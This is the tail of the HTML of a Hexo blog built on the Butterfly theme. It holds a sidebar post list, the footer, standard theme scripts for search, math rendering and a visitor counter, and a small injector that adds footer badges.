datetime="2023-11-02T03:15:49.185Z" title="Created 2023-11-02 11:15:49">2023-11-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/0.html" title="No title">No title</a><time datetime="2023-11-02T03:02:50.601Z" title="Created 2023-11-02 11:02:50">2023-11-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By hungs</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/fancybox/3.5.7/jquery.fancybox.min.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js"></script><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', { class: 'katex-wrap'})
+  })
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
+    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" rel="external nofollow noreferrer" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" rel="external nofollow noreferrer" style="margin-inline:5px" data-title="主题版本Butterfly_v4.2.2" title=""><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referral" rel="external nofollow noreferrer" style="margin-inline:5px" data-title="本站由又拍云为静态资源提供CDN加速/云存储服务" title=""><img src="https://img.shields.io/badge/CDN-upyun-orange?logo=data:image/png;base64,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" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" rel="external nofollow noreferrer" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="/js/runtime/runtime.js"></script><!-- hexo injector body_end end --></body></html>
